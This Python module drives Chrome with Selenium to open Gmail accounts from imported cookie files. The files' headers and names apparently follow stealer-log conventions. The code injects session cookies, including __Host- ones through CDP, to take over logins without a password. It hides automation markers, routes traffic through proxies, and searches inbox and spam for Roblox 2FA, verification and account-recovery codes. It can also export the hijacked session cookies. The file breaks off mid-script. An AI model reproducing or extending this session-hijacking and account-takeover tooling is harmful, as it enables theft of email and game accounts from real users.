import errno

import json

import re

import shutil

import sys

import tempfile

import time

import urllib.parse

import zipfile

from pathlib import Path

from typing import Callable

from selenium import webdriver

from selenium.webdriver.chrome.options import Options

from selenium.webdriver.chrome.service import Service as ChromeService

from selenium.webdriver.common.by import By

from selenium.webdriver.common.keys import Keys

from selenium.webdriver.support import expected_conditions as EC

from selenium.webdriver.support.ui import WebDriverWait

from gmail_automation.mail_parse import (

    extract_2fa_code_from_thread,

    extract_all_verification_codes,

    extract_verification_code,

    is_2fa_code_letter,

    is_2fa_status_notification_letter,

    is_email_verify_letter,

    is_recovery_code_letter,

    is_roblox_letter,

)

_last_poll_abort_reason = ""

def get_last_poll_abort_reason() -> str:

    return _last_poll_abort_reason

def clear_last_poll_abort_reason() -> None:

    global _last_poll_abort_reason

    _last_poll_abort_reason = ""

CODE_ALL_RE = re.compile(r"\b(\d{6})\b")

from gmail_automation.proxy import write_proxy_extension_zip

POLL_ATTEMPTS = 20

POLL_SLEEP_S = 2.5

INBOX_LIMIT = 25

ROBLOX_MAIL_LIMIT = 50

ROBLOX_SEARCH_LINK = "from:roblox.com"

ROBLOX_SPAM_SEARCH_LINK = "from:roblox.com in:spam"

ROBLOX_SPAM_RECOVERY_SEARCH_LINK = 'from:roblox.com in:spam "Account Recovery"'

ROBLOX_ADVANCED_SEARCH_SENDER = "roblox.com"

_EXTRACT_JS = r"""
const lim = arguments[0];
const listScope = (arguments[1] || "").toLowerCase();
const out = [];
const main = document.querySelector('div[role="main"]');
const pool = main || document.body;
let raw = pool.querySelectorAll("tr.zA");
if (!raw.length) raw = pool.querySelectorAll('tr[role="row"]');
const rowHrefSpam = (tr) => {
    for (const a of tr.querySelectorAll("a[href]")) {
        if (/#spam[\/]/i.test(a.getAttribute("href") || "")) return true;
    }
    return false;
};
const rowHrefInboxOrNeutral = (tr) => {
    for (const a of tr.querySelectorAll('a[href*="mail.google"]')) {
        const h = a.getAttribute("href") || "";
        if (/#spam[\/]/i.test(h)) continue;
        if (/#(?:inbox|all|search|sent|drafts|starred|important)[\/]/i.test(h)) return true;
        if (/#thread-f:/i.test(h)) return true;
    }
    for (const a of tr.querySelectorAll("a[href]")) {
        const h = a.getAttribute("href") || "";
        if (/mail\.google/.test(h) && !/#spam[\/]/i.test(h)) return true;
    }
    return false;
};
const rowHrefSearch = (tr) => {
    for (const a of tr.querySelectorAll("a[href]")) {
        const h = a.getAttribute("href") || "";
        if (/#(?:search|advanced-search)[\/=]/i.test(h)) return true;
    }
    return false;
};
const isVisible = (tr) => {
    const r = tr.getBoundingClientRect();
    if (r.width < 2 || r.height < 2) return false;
    const st = window.getComputedStyle(tr);
    if (st.display === "none" || st.visibility === "hidden" || parseFloat(st.opacity || "1") < 0.05)
        return false;
    return true;
};
const trs = [];
for (const tr of raw) {
    if (!isVisible(tr)) continue;
    if (listScope === "spam") {
        if (!rowHrefSpam(tr)) continue;
    } else if (listScope === "inbox") {
        if (rowHrefSpam(tr) && !rowHrefInboxOrNeutral(tr)) continue;
    } else if (listScope === "search") {
        let ok = rowHrefSearch(tr) || rowHrefInboxOrNeutral(tr);
        if (!ok) {
            for (const a of tr.querySelectorAll("a[href*='mail.google']")) ok = true;
        }
        if (!ok) continue;
    }
    trs.push(tr);
}
let listTrs = trs;
if (listScope === "spam" && listTrs.length === 0) {
    for (const tr of raw) {
        if (isVisible(tr)) listTrs.push(tr);
    }
}
const pickMailId = (tr, bog) => {
    const fmRe = /(FM[A-Za-z0-9_-]{16,})/;
    const takeFm = (s) => { const m = (s || "").match(fmRe); return m ? m[1] : ""; };
    const takeFmFromHref = (h) => {
        const m = (h || "").match(/#(?:search|advanced-search|inbox|all|sent|drafts|spam)\/(FM[A-Za-z0-9_-]+)/i);
        if (m) return m[1];
        const m2 = (h || "").match(/\/(FM[A-Za-z0-9_-]{16,})/);
        return m2 ? m2[1] : takeFm(h);
    };
    const takeThreadFromHref = (h) => {
        const m = (h || "").match(/thread-f:(\d{13,22})/i);
        return m ? ("thread-f:" + m[1]) : "";
    };
    let threadHref = "";
    for (const a of tr.querySelectorAll("a[href]")) {
        const h = a.getAttribute("href") || "";
        const fm = takeFmFromHref(h);
        if (fm) { threadHref = h; return fm; }
        const th = takeThreadFromHref(h);
        if (th) { threadHref = h; return th; }
    }
    for (const sel of ["span[data-thread-id]", "[data-thread-perm-id]", "span[data-legacy-thread-id]"]) {
        const el = tr.querySelector(sel) || bog.querySelector(sel);
        if (!el) continue;
        let v = (el.getAttribute("data-thread-id")
            || el.getAttribute("data-thread-perm-id")
            || el.getAttribute("data-legacy-thread-id") || "").replace(/^#/, "").trim();
        if (/^FM[A-Za-z0-9_-]{16,}$/.test(v)) return v;
        const leg = v.match(/^thread-f:(\d{13,22})$/i) || v.match(/^(\d{13,22})$/);
        if (leg) return "thread-f:" + (leg[1] || leg[0]);
    }
    let x = takeFm(tr.outerHTML);
    if (x) return x;
    return "";
};
const pickThreadHref = (tr, bog, mailId) => {
    const fmRe = /(FM[A-Za-z0-9_-]{16,})/;
    const threadRe = /thread-f:\d{13,22}/i;
    for (const a of tr.querySelectorAll("a[href]")) {
        const h = a.getAttribute("href") || "";
        if (!/mail\.google/.test(h)) continue;
        if (mailId && mailId.startsWith("FM") && h.includes(mailId)) return h;
        if (mailId && mailId.startsWith("thread-f:") && h.includes(mailId.slice(9))) return h;
        if (fmRe.test(h) || threadRe.test(h)) return h;
    }
    return "";
};
for (const tr of listTrs) {
    if (out.length >= lim) break;
    const bog = tr.querySelector(".bog");
    if (!bog) continue;
    const subject = bog.innerText.replace(/\s+/g, " ").trim();
    const emailEl = tr.querySelector("span[email].yP, span[email].zF, .yP[email], .zF[email]");
    let fromAddr = "";
    if (emailEl) {
        fromAddr = (emailEl.getAttribute("email") || emailEl.textContent || "").trim();
    }
    const y2 = tr.querySelector(".y2");
    const snippet = y2 ? y2.innerText.replace(/\s+/g, " ").trim() : "";
    if (!subject && !fromAddr && !snippet) continue;
    const mailId = pickMailId(tr, bog);
    const threadHref = pickThreadHref(tr, bog, mailId);
    let listTimeMs = 0;
    const te = tr.querySelector("td.xW [title], td.xW span[title], td.xs [title]");
    const tit = te ? te.getAttribute("title") || "" : "";
    let ts = Date.parse(tit);
    if (isNaN(ts)) {
        const t2 = tr.querySelector("td.xs span[title], span[title]");
        ts = Date.parse((t2 && t2.getAttribute("title")) || "");
    }
    if (!isNaN(ts)) listTimeMs = ts;
    if (!listTimeMs) {
        const cell = tr.querySelector("td.xW, td.xs");
        const cellText = cell ? (cell.innerText || "").trim() : "";
        const rel = cellText.match(/(\d{1,2}):(\d{2})\s*(AM|PM)/i);
        if (rel) {
            const now = new Date();
            let h = parseInt(rel[1], 10);
            const min = parseInt(rel[2], 10);
            const pm = /pm/i.test(rel[3]);
            if (pm && h < 12) h += 12;
            if (!pm && h === 12) h = 0;
            now.setHours(h, min, 0, 0);
            listTimeMs = now.getTime();
        }
    }
    let stackCount = 1;
    for (const sel of [".bs", "span.bs", ".bA4 .bs", ".y6 .bs"]) {
        const el = tr.querySelector(sel);
        if (el) {
            const n = parseInt((el.innerText || "").trim(), 10);
            if (n > 1) { stackCount = n; break; }
        }
    }
    const fromText = emailEl ? (emailEl.textContent || "").replace(/\s+/g, " ").trim() : "";
    const cntM = (fromText + " " + subject).match(/\b(\d{1,3})\b/g);
    if (cntM) {
        for (const x of cntM) {
            const n = parseInt(x, 10);
            if (n > 1 && n <= 99) stackCount = Math.max(stackCount, n);
        }
    }
    out.push({ from: fromAddr, subject, snippet, mailId, listTimeMs, stackCount, threadHref });
}
return out;
"""

def parse_cookie_bundle(path: Path) -> tuple[str | None, str | None, list[dict]]:

    text = path.read_text(encoding="utf-8", errors="ignore")

    header_email = None

    identif = None

    for pat in (

        r"[-–—]\s*Email:\s*(\S+@\S+)",

        r"#\s*Email:\s*(\S+@\S+)",

        r"Email:\s*(\S+@\S+)",

        r"\[([^\]]+@[^\]]+)\]\.txt",

    ):

        m = re.search(pat, text, re.I)

        if m:

            header_email = m.group(1).strip().rstrip(")").strip("‪").strip("‬")

            break

    m2 = re.search(r"-\s*Identif:\s*(\d+)", text, re.I)

    if m2:

        identif = m2.group(1)

    if not header_email:

        m3 = re.search(r"\[([^\]]+@[^\]]+)\]", path.name)

        if m3:

            header_email = m3.group(1).strip()

    if not header_email:

        m3b = re.search(r"([a-z0-9._+-]+)@gmail_com", path.name, re.I)

        if m3b:

            header_email = f"{m3b.group(1)}@gmail.com"

    if identif is None:

        m4 = re.search(r"\[u(\d+)\]", path.name, re.I)

        if m4:

            identif = m4.group(1)

    if identif is None:

        m5 = re.search(r"[_\[]u(\d+)[_\]]", path.name, re.I)

        if m5:

            identif = m5.group(1)

    cookies = parse_netscape_cookies_text(text)

    return header_email, identif, cookies

def parse_netscape_cookies_text(text: str) -> list[dict]:

    cookies: list[dict] = []

    seen: set[str] = set()

    for raw_line in text.splitlines():

        line = raw_line.strip()

        if not line or line.startswith("#"):

            continue

        parts = line.split("\t")

        if len(parts) < 7:

            continue

        domain, _, path_val, secure, expiry, name, value = parts[:7]

        key = f"{name}@{domain}@{path_val or '/'}"

        if key in seen:

            continue

        seen.add(key)

        is_secure = secure.upper() == "TRUE" or name.startswith("__Secure-")

        c = {

            "name": name,

            "value": value,

            "domain": domain,

            "path": path_val or "/",

            "secure": is_secure,

        }

        try:

            exp_i = int(expiry)

            if exp_i > 0:

                c["expiry"] = exp_i

        except (TypeError, ValueError):

            pass

        cookies.append(c)

    return cookies

def cookie_domain(c: dict) -> str:

    return (c.get("domain") or "").lstrip(".")

def _cookie_host(c: dict) -> str:

    dom = (c.get("domain") or "").lstrip(".")

    return dom or "google.com"

def _inject_cdp_cookie(driver, c: dict) -> bool:

    name = c.get("name") or ""

    value = c.get("value") or ""

    if not name or not value:

        return False

    path = c.get("path") or "/"

    host = _cookie_host(c)

    url = f"https://{host}{path if path.startswith('/') else '/' + path}"

    payload: dict = {"name": name, "value": value, "url": url, "secure": True}

    if c.get("expiry"):

        try:

            payload["expires"] = int(c["expiry"])

        except (TypeError, ValueError):

            pass

    try:

        driver.execute_cdp_cmd("Network.setCookie", payload)

        return True

    except Exception:

        return False

def _inject_one_cookie(driver, c: dict) -> bool:

    name = c.get("name") or ""

    if name.startswith("__Host-"):

        return _inject_cdp_cookie(driver, c)

    try:

        driver.add_cookie(c)

        return True

    except Exception:

        return False

def _cookie_auth_slots(cookies: list[dict]) -> list[str]:

    slots: set[str] = set()

    for c in cookies:

        m = re.search(r"/mail/u/(\d+)", c.get("path") or "")

        if m:

            slots.add(m.group(1))

    return sorted(slots, key=int)

def inject_cookies(

    driver,

    cookies: list[dict],

    log: Callable[[str], None] | None = None,

    *,

    prefer_auth: str | None = None,

) -> tuple[int, int]:

    from retriever_shared.bind.bind_debug import stage_log

    attempts = ok = 0

    gc = [c for c in cookies if cookie_domain(c) == "google.com"]

    mc = [c for c in cookies if cookie_domain(c) == "mail.google.com"]

    ac = [c for c in cookies if cookie_domain(c) == "accounts.google.com"]

    host_n = sum(1 for c in cookies if (c.get("name") or "").startswith("__Host-"))

    slots = _cookie_auth_slots(mc)

    auth = str(

        prefer_auth

        or (slots[0] if len(slots) == 1 else "")

        or "0"

    )

    inject_slots = slots if slots else [auth]

    stage_log(

        log,

        "cookie",

        f"bundle={len(cookies)} __Host={host_n} "

        f"google={len(gc)} mail={len(mc)} accounts={len(ac)} "

        f"slots=u{','.join(inject_slots) if inject_slots else auth}",

    )

    driver.get("https://www.google.com/")

    time.sleep(0.25)

    g_ok = 0

    for c in gc:

        attempts += 1

        if _inject_one_cookie(driver, c):

            ok += 1

            g_ok += 1

    stage_log(log, "cookie", f".google.com injected {g_ok}/{len(gc)}")

    root_mc = [c for c in mc if not re.search(r"/mail/u/\d+", c.get("path") or "")]

    slot_mc = [c for c in mc if c not in root_mc]

    driver.get("https://mail.google.com/")

    time.sleep(0.25)

    m_ok = 0

    for c in root_mc:

        attempts += 1

        if _inject_one_cookie(driver, c) or _inject_cdp_cookie(driver, c):

            ok += 1

            m_ok += 1

    if slot_mc:

        for slot in inject_slots:

            driver.get(f"https://mail.google.com/mail/u/{slot}/")

            time.sleep(0.3)

            for c in slot_mc:

                path = c.get("path") or ""

                if f"/mail/u/{slot}" not in path and inject_slots != [slot]:

                    continue

                if len(inject_slots) > 1 and f"/mail/u/{slot}" not in path:

                    continue

                attempts += 1

                if _inject_one_cookie(driver, c) or _inject_cdp_cookie(driver, c):

                    ok += 1

                    m_ok += 1

    stage_log(log, "cookie", f"mail.google.com injected {m_ok}/{len(mc)}")

    if ac:

        driver.get("https://accounts.google.com/")

        time.sleep(0.25)

        a_ok = 0

        for c in ac:

            attempts += 1

            if _inject_one_cookie(driver, c):

                ok += 1

                a_ok += 1

        stage_log(log, "cookie", f"accounts.google.com injected {a_ok}/{len(ac)}")

    stage_log(log, "cookie", f"total inject {ok}/{attempts}")

    return ok, attempts

def _chrome_binary_path() -> str | None:

    if sys.platform == "darwin":

        for p in (

            "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome",

            "/Applications/Chromium.app/Contents/MacOS/Chromium",

        ):

            if Path(p).is_file():

                return p

    return None

def create_gmail_driver(

    *,

    headless: bool,

    tmp_profile: str,

    session_proxy: dict[str, str] | None = None,

    performance_log: bool = False,

) -> webdriver.Chrome:

    ext_zip: str | None = None

    if session_proxy:

        pzip = Path(tmp_profile) / "proxy_auth.zip"

        write_proxy_extension_zip(session_proxy, pzip, socks5=False)

        ext_zip = str(pzip)

    chrome_options = Options()

    if headless:

        chrome_options.add_argument("--headless=new")

        chrome_options.add_argument("--disable-gpu")

        chrome_options.add_argument("--window-size=1920,1080")

    if sys.platform.startswith("linux"):

        chrome_options.add_argument("--no-sandbox")

    chrome_options.add_argument("--disable-dev-shm-usage")

    chrome_options.add_argument("--disable-blink-features=AutomationControlled")

    chrome_options.add_argument(f"--user-data-dir={tmp_profile}")

    bp = _chrome_binary_path()

    if bp:

        chrome_options.binary_location = bp

    chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])

    chrome_options.add_experimental_option("useAutomationExtension", False)

    if ext_zip:

        chrome_options.add_extension(ext_zip)

    if performance_log:

        chrome_options.set_capability(

            "goog:loggingPrefs",

            {"performance": "ALL", "browser": "ALL"},

        )

    return webdriver.Chrome(service=ChromeService(), options=chrome_options)

def make_temp_profile() -> str:

    return tempfile.mkdtemp(prefix="gmail_auto_")

def cleanup_profile(path: str) -> None:

    try:

        shutil.rmtree(path, ignore_errors=True)

    except OSError:

        pass

def parse_gmail_u_from_url(url: str) -> str | None:

    m = re.search(r"/mail/u/(\d+)", url or "")

    return m.group(1) if m else None

def snapshot_gmail_location(driver) -> tuple[str, str | None]:

    final_url = driver.current_url or ""

    return final_url, parse_gmail_u_from_url(final_url)

def wait_gmail_ready(driver, wait_sec: float = 8.0) -> str:

    deadline = time.time() + wait_sec

    while time.time() < deadline:

        try:

            url = driver.current_url or ""

        except Exception:

            url = ""

        if "mail.google.com" in url:

            return url

        time.sleep(0.35)

    return driver.current_url or ""

def resolve_gmail_auth_u(

    driver,

    wait: WebDriverWait,

    start_ident: str = "0",

    *,

    log=None,

) -> str:

    _log = log or (lambda _m: None)

    found = 0

    for u in range(0, 10):

        driver.get(f"https://mail.google.com/mail/u/{u}/#inbox")

        try:

            wait.until(EC.presence_of_element_located((By.TAG_NAME, "body")))

        except Exception:

            pass

        wait_gmail_ready(driver, 8.0)

        _, auth_s = snapshot_gmail_location(driver)

        auth = int(auth_s or "0")

        if u >= 1 and auth == 0:

            _log(f"resolve_u: u{u}→u0 stop (max u{found})")

            break

        found = auth

        _log(f"resolve_u: u{u}→u{auth}")

    try:

        prefer = int(start_ident)

        if prefer == found:

            return str(prefer)

    except (TypeError, ValueError):

        pass

    return str(found)

def export_gmail_cookies_netscape(

    driver,

    out_path: Path,

    header_email: str = "",

) -> bool:

    try:

        cookies = driver.get_cookies()

    except Exception:

        return False

    lines = ["# Netscape HTTP Cookie File", "# Gmail session export"]

    if header_email:

        lines.append(f"# Email: {header_email}")

    for c in cookies:

        domain = c.get("domain") or ".google.com"

        if not domain.startswith("."):

            domain = "." + domain.lstrip(".")

        path = c.get("path") or "/"

        secure = "TRUE" if c.get("secure") else "FALSE"

        expiry = str(int(c.get("expiry") or (time.time() + 86400 * 30)))

        name = c.get("name") or ""

        value = c.get("value") or ""

        if not name:

            continue

        lines.append(f"{domain}\tTRUE\t{path}\t{secure}\t{expiry}\t{name}\t{value}")

    try:

        out_path.parent.mkdir(parents=True, exist_ok=True)

        out_path.write_text("\n".join(lines) + "\n", encoding="utf-8")

        return True

    except OSError:

        return False

def extract_recent_inbox_messages(driver, limit: int, list_scope: str | None = None) -> list[dict]:

    scope = (list_scope or "").strip().lower()

    rows = driver.execute_script(_EXTRACT_JS, limit, scope)

    if not rows:

        try:

            html = driver.page_source or ""

        except Exception:

            html = ""

        if html:

            rows = extract_rows_from_page_source(html, limit)

    return rows or []

_FM_ID_RE = re.compile(r"(FM[A-Za-z0-9_-]{16,})")

_THREAD_F_RE = re.compile(r"thread-f:(\d{13,22})", re.I)

_LEGACY_THREAD_RE = re.compile(r"^\d{13,22}$")

def normalize_thread_mail_id(row: dict) -> str:

    mid = (row.get("mailId") or "").strip()

    href = (row.get("threadHref") or "").strip()

    if href:

        fm = _FM_ID_RE.search(href)

        if fm:

            return fm.group(1)

        tm = _THREAD_F_RE.search(href)

        if tm:

            return f"thread-f:{tm.group(1)}"

    if mid.startswith("FM") and len(mid) >= 18:

        return mid

    tm = _THREAD_F_RE.search(mid)

    if tm:

        return f"thread-f:{tm.group(1)}"

    if _LEGACY_THREAD_RE.match(mid):

        return f"thread-f:{mid}"

    fm = _FM_ID_RE.search(mid)

    if fm:

        return fm.group(1)

    return mid

def thread_hash_frag(mail_id: str, box: str = "inbox") -> str:

    mid = (mail_id or "").strip()

    if not mid:

        return ""

    if box == "spam":

        prefix = "spam/"

    elif box == "all":

        prefix = "all/"

    else:

        prefix = "inbox/"

    if mid.startswith("FM"):

        return f"#{prefix}{mid}"

    if mid.startswith("thread-f:"):

        return f"#{prefix}{mid}"

    if _LEGACY_THREAD_RE.match(mid):

        return f"#{prefix}thread-f:{mid}"

    return f"#{prefix}{mid}" if mid else ""

def _click_thread_row(driver, mail_id: str, subject: str) -> bool:

    try:

        return bool(

            driver.execute_script(

                r"""
                const mailId = arguments[0] || "";
                const subject = (arguments[1] || "").slice(0, 60).toLowerCase();
                const fm = mailId.startsWith("FM") ? mailId : "";
                const threadNum = (mailId.match(/thread-f:(\d{13,22})/i) || [])[1]
                    || (/^\d{13,22}$/.test(mailId) ? mailId : "");
                const subjKey = subject.replace(/[^\w\s]/g, " ").split(/\s+/).filter(w => w.length > 3).slice(0, 4).join(" ");
                for (const tr of document.querySelectorAll('tr.zA, tr[role="row"]')) {
                    const bog = tr.querySelector('.bog');
                    if (!bog) continue;
                    const subj = (bog.innerText || '').replace(/\s+/g,' ').trim().toLowerCase();
                    let subjOk = !subject;
                    if (subject && subj) {
                        subjOk = subj.includes(subject.slice(0, 24)) || subject.includes(subj.slice(0, 24));
                        if (!subjOk && subjKey) {
                            const words = subjKey.split(" ");
                            subjOk = words.filter(w => subj.includes(w)).length >= Math.min(2, words.length);
                        }
                    }
                    if (!subjOk) continue;
                    for (const a of tr.querySelectorAll('a[href*="mail.google"], a[href*="/#"]')) {
                        const h = a.getAttribute('href') || '';
                        if (fm && h.includes(fm)) { a.click(); return true; }
                        if (threadNum && h.includes(threadNum)) { a.click(); return true; }
                        if (/FM[A-Za-z0-9_-]{16,}/.test(h)) { a.click(); return true; }
                    }
                    try { tr.click(); return true; } catch (e) {}
                }
                return false;
                """,

                mail_id,

                subject,

            )

        )

    except Exception:

        return False

def _thread_view_open(driver, subject: str) -> bool:

    try:

        return bool(

            driver.execute_script(

                r"""
                const subj = (arguments[0] || '').toLowerCase().slice(0, 40);
                const a3s = document.querySelector('div.a3s');
                if (a3s) {
                    const t = (a3s.innerText || '').trim();
                    if (t.length > 60) return true;
                }
                const listRows = document.querySelectorAll('tr.zA').length;
                if (listRows > 4) return false;
                const hdr = document.querySelector('h2.hP, div.ha');
                if (hdr && subj) {
                    const ht = (hdr.innerText || '').toLowerCase();
                    if (ht.includes(subj.slice(0, 18))) return true;
                }
                return false;
                """,

                subject,

            )

        )

    except Exception:

        return False

def _open_via_gmail_search(driver, auth: str, subject: str) -> bool:

    q = urllib.parse.quote(f'from:roblox.com "{subject[:55]}"')

    driver.get(f"https://mail.google.com/mail/u/{auth}/#search/{q}")

    time.sleep(1.6)

    return _click_thread_row(driver, "", subject)

def extract_rows_from_page_source(html: str, limit: int = 25) -> list[dict]:

    if not html:

        return []

    rows: list[dict] = []

    seen: set[str] = set()

    for m in _FM_ID_RE.finditer(html):

        mid = m.group(1)

        if mid in seen:

            continue

        seen.add(mid)

        rows.append(

            {

                "from": "",

                "subject": "",

                "snippet": "",

                "mailId": mid,

                "listTimeMs": 0,

                "stackCount": 1,

            }

        )

        if len(rows) >= limit:

            break

    return rows

def msg_list_time_ms(msg: dict) -> int:

    v = msg.get("listTimeMs")

    if v in (None, ""):

        return 0

    try:

        return int(float(v))

    except (TypeError, ValueError):

        return 0

GMAIL_LIST_TMS_SLACK_MS = 120_000

def list_tms_stale(tms: int, cutoff_ms: int) -> bool:

    if not cutoff_ms or not tms:

        return False

    return tms + GMAIL_LIST_TMS_SLACK_MS < cutoff_ms

def dedupe_inbox_rows_by_mail_id(rows: list[dict]) -> list[dict]:

    if not rows:

        return rows

    seen: dict[str, dict] = {}

    order: list[str] = []

    for idx, msg in enumerate(rows):

        mid = (msg.get("mailId") or "").strip()

        key = mid if mid else f"__noid_{idx}"

        if key not in seen:

            seen[key] = msg

            order.append(key)

    return [seen[k] for k in order]

def gmail_msg_thread_num(msg: dict) -> int:

    mid = (msg.get("mailId") or "").strip()

    m = re.search(r"thread-f:(\d+)", mid, re.I) or re.search(r"#thread-f:(\d+)", mid)

    return int(m.group(1)) if m else 0

def row_stack_count(msg: dict) -> int:

    try:

        n = int(msg.get("stackCount") or 1)

    except (TypeError, ValueError):

        n = 1

    if n > 999:

        n = 1

    return max(n, 1)

def gmail_advanced_search_link(auth: str, sender: str) -> str:

    from_val = urllib.parse.quote((sender or "roblox.com").strip(), safe="")

    return (

        f"https://mail.google.com/mail/u/{auth}/"

        f"#advanced-search/from={from_val}&sizeoperator=s_sl&sizeunit=s_smb"

    )

def gmail_search_link(auth: str, query: str = ROBLOX_SEARCH_LINK) -> str:

    q = (query or ROBLOX_SEARCH_LINK).strip()

    m = re.match(r"from:(.+)", q, re.I)

    sender = m.group(1).strip() if m else q

    if " in:" in q.lower() or q.lower().startswith("in:"):

        enc = urllib.parse.quote(q, safe="")

        return f"https://mail.google.com/mail/u/{auth}/#search/{enc}"

    return gmail_advanced_search_link(auth, sender or ROBLOX_ADVANCED_SEARCH_SENDER)

def _wait_advanced_search_rows(

    driver,

    wait: WebDriverWait,

    *,

    min_rows: int = 1,

    timeout_s: float = 15.0,

) -> int:

    deadline = time.time() + timeout_s

    last = 0

    while time.time() < deadline:

        try:

            wait.until(EC.presence_of_element_located((By.TAG_NAME, "body")))

        except Exception:

            pass

        rows = extract_recent_inbox_messages(driver, ROBLOX_MAIL_LIMIT, None)

        good = [

            r

            for r in rows

            if (r.get("from") or "").strip() or (r.get("subject") or "").strip()

        ]

        last = len(good)

        if last >= min_rows:

            return last

        time.sleep(0.5)

    return last

def _wait_mail_list_rows(driver, wait: WebDriverWait, *, min_rows: int = 1) -> int:

    return _wait_advanced_search_rows(

        driver, wait, min_rows=min_rows, timeout_s=12.0

    )

def fetch_advanced_search_rows(

    driver,

    wait: WebDriverWait,

    auth: str,

    limit: int = ROBLOX_MAIL_LIMIT,

    *,

    sender: str = ROBLOX_ADVANCED_SEARCH_SENDER,

    log: Callable[[str], None] | None = None,

) -> list[dict]:

    _log = log or (lambda _m: None)

    url = gmail_advanced_search_link(auth, sender)

    driver.get(url)

    try:

        wait.until(EC.presence_of_element_located((By.TAG_NAME, "body")))

    except Exception:

        pass

    time.sleep(0.35)

    _wait_advanced_search_rows(driver, wait, min_rows=1, timeout_s=15.0)

    cur = (driver.current_url or "").lower()

    if "#advanced-search/" not in cur:

        _log(f"advanced-search miss url={cur[:90]} expected=#advanced-search/")

    rows = extract_recent_inbox_messages(driver, limit, "search")

    for r in rows:

        r["_box"] = "search"

        r["_search_sender"] = sender

    _log(f"advanced-search from={sender!r} rows={len(rows)} url={cur[:80]}")

    return rows

def fetch_search_rows(

    driver,

    wait: WebDriverWait,

    auth: str,

    query: str,

    limit: int = 25,

    *,

    log: Callable[[str], None] | None = None,

    box: str = "search",

) -> list[dict]:

    q = (query or ROBLOX_SEARCH_LINK).strip()

    if " in:" in q.lower() or q.lower().startswith("in:"):

        url = gmail_search_link(auth, q)

        _log = log or (lambda _m: None)

        driver.get(url)

        try:

            wait.until(EC.presence_of_element_located((By.TAG_NAME, "body")))

        except Exception:

            pass

        time.sleep(0.45)

        _wait_advanced_search_rows(driver, wait, min_rows=0, timeout_s=12.0)

        cur = (driver.current_url or "").lower()

        rows = extract_recent_inbox_messages(driver, limit, "search")

        for r in rows:

            r["_box"] = box

            r["_search_query"] = q

        _log(f"search {q!r} rows={len(rows)} url={cur[:80]}")

        return rows

    m = re.match(r"from:(.+)", q, re.I)

    sender = (m.group(1).strip() if m else q) or ROBLOX_ADVANCED_SEARCH_SENDER

    return fetch_advanced_search_rows(

        driver, wait, auth, limit, sender=sender, log=log

    )

def fetch_spam_search_rows(

    driver,

    wait: WebDriverWait,

    auth: str,

    limit: int = INBOX_LIMIT,

    *,

    log: Callable[[str], None] | None = None,

) -> list[dict]:

    return fetch_search_rows(

        driver,

        wait,

        auth,

        ROBLOX_SPAM_SEARCH_LINK,

        limit,

        log=log,

        box="spam",

    )

def fetch_spam_recovery_search_rows(

    driver,

    wait: WebDriverWait,

    auth: str,

    limit: int = INBOX_LIMIT,

    *,

    log: Callable[[str], None] | None = None,

) -> list[dict]:

    return fetch_search_rows(

        driver,

        wait,

        auth,

        ROBLOX_SPAM_RECOVERY_SEARCH_LINK,

        limit,

        log=log,

        box="spam",

    )

def fetch_roblox_search_rows(

    driver,

    wait: WebDriverWait,

    auth: str,

    limit: int = ROBLOX_MAIL_LIMIT,

    *,

    log: Callable[[str], None] | None = None,

    gentle: bool = True,

) -> list[dict]:

    return fetch_advanced_search_rows(

        driver,

        wait,

        auth,

        limit,

        sender=ROBLOX_ADVANCED_SEARCH_SENDER,

        log=log,

    )

def _gmail_search_box_query(driver) -> str:

    try:

        return str(

            driver.execute_script(

                r"""
                for (const sel of [
                    'input[name="q"]',
                    'input[aria-label*="Search" i]',
                    'input[aria-label*="Поиск" i]',
                    'input.gb_f',
                ]) {
                    for (const el of document.querySelectorAll(sel)) {
                        const v = (el.value || '').trim();
                        if (v) return v;
                    }
                }
                return '';
                """

            )

            or ""

        ).strip()

    except Exception:

        return ""

_CONVERSATION_VIEW_LABELS_JS = r"""
[
  'conversation view', 'email threading', 'threading',
  'просмотр в виде цепочек', 'visualização de conversas', 'visualizacao de conversas',
  'visualização em lista', 'visualizacao em lista',
  'conversa por e-mail', 'conversa por email',
  'affichage des conversations', 'conversaciones agrupadas',
  'gruppierung von', 'visualizzazione in thread', 'thread-weergave', 'gruppering av'
]
"""

_CONVERSATION_VIEW_REGEX_JS = r"""
[
  /conversation view/i,
  /email threading/i,
  /visualiza[cç][aã]o de conversas/i,
  /visualiza[cç][aã]o em lista/i,
  /просмотр в виде цепочек/i,
  /affichage des conversations/i,
  /gruppierung von nachrichten/i,
  /conversaciones agrupadas/i
]
"""

_DETECT_THREAD_STACKS_JS = r"""
for (const el of document.querySelectorAll('.bs, span.bs, .bA4 .bs')) {
  const n = parseInt((el.innerText || '').trim(), 10);
  if (n > 1) return true;
}
return false;
"""

_CLOSE_GMAIL_SETTINGS_JS = r"""
document.dispatchEvent(new KeyboardEvent('keydown', {key:'Escape', bubbles:true}));
return true;
"""

_CLICK_GMAIL_SETTINGS_JS = r"""
const settingsRe = /settings|настройки|configurações|configuracoes|configuración|einstellungen|paramètres|impostazioni/i;
for (const el of document.querySelectorAll('a.FH, [data-tooltip], [role=button], button')) {
  const hint = ((el.getAttribute('aria-label') || '') + ' ' +
    (el.getAttribute('data-tooltip') || '') + ' ' + (el.className || '')).trim();
  if (settingsRe.test(hint) && (el.classList.contains('FH') || settingsRe.test(hint))) {
    try { el.click(); return true; } catch (e) {}
  }
}
for (const el of document.querySelectorAll('a.FH')) {
  try { el.click(); return true; } catch (e) {}
}
return false;
"""

_SCROLL_SETTINGS_PANEL_JS = r"""
for (const sel of ['[role=complementary]', '[role=menu]', '[role=dialog]', '.bAw', '.J-KU', '.nH']) {
  for (const el of document.querySelectorAll(sel)) {
    try {
      el.scrollTop = el.scrollHeight;
      el.scrollIntoView({block: 'end', behavior: 'instant'});
    } catch (e) {}
  }
}
window.scrollTo(0, document.body.scrollHeight);
return true;
"""

_CONVERSATION_VIEW_MATCH_JS = (

    r"""
const labelRes = """

    + _CONVERSATION_VIEW_REGEX_JS

    + r""";
const labels = """

    + _CONVERSATION_VIEW_LABELS_JS

    + r""";

function matchesLabelText(text) {
  const t = (text || '').trim();
  if (!t || t.length > 220) return false;
  if (labelRes.some(r => r.test(t))) return true;
  const low = t.toLowerCase();
  return labels.some(l => low.includes(l));
}

function isChecked(cb) {
  if (!cb) return false;
  const aria = cb.getAttribute('aria-checked');
  if (aria === 'true' || aria === 'mixed') return true;
  if (aria === 'false') return false;
  return cb.checked === true;
}

function findConversationCheckbox() {
  for (const cb of document.querySelectorAll('input.SS[type=checkbox], input[type=checkbox].SS')) {
